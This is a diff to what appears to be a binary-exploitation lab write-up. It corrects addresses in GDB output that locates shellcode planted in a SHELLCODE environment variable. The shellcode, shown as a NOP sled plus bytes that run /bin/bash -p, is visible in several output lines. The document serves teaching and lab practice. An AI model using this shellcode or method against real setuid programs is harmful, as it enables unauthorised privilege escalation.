@@ -168,7 +168,7 @@ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 
 Breakpoint 1, 0x080491ed in main ()
 (gdb) x/s *((char**)environ+1)
-0xffffd549:     "SHELLCODE=", '\302\220' <repeats 50 times>, "j\vX\302\231Rfh-p\302\211áRjhh/bash/bin\302\211ãRQS\302\211áÍ\302\200"
+0xffffd584:     "SHELLCODE=", '\302\220' <repeats 50 times>, "j\vX\302\231Rfh-p\302\211áRjhh/bash/bin\302\211ãRQS\302\211áÍ\302\200"
 (gdb) 
 
 ```
@@ -178,9 +178,9 @@ In GDB, we can see the pointer to our SHELLCODE as 0xffffd584. We need to adjust
 Breakpoint 1, 0x080491ed in main ()
 (gdb) x/s *((char**)environ+1)
 0xffffd584:     "SHELLCODE=", '\302\220' <repeats 50 times>, "j\vX\302\231Rfh-p\302\211áRjhh/bash/bin\302\211ãRQS\302\211áÍ\302\200"
-(gdb) x/s 0xffffd549+10
+(gdb) x/s 0xffffd584+10
 0xffffd58e:     '\302\220' <repeats 50 times>, "j\vX\302\231Rfh-p\302\211áRjhh/bash/bin\302\211ãRQS\302\211áÍ\302\200"
-(gdb) x/s 0xffffd553+50
+(gdb) x/s 0xffffd58e+50
 0xffffd5c0:     '\302\220' <repeats 25 times>, "j\vX\302\231Rfh-p\302\211áRjhh/bash/bin\302\211ãRQS\302\211áÍ\302\200"
 (gdb) 
 
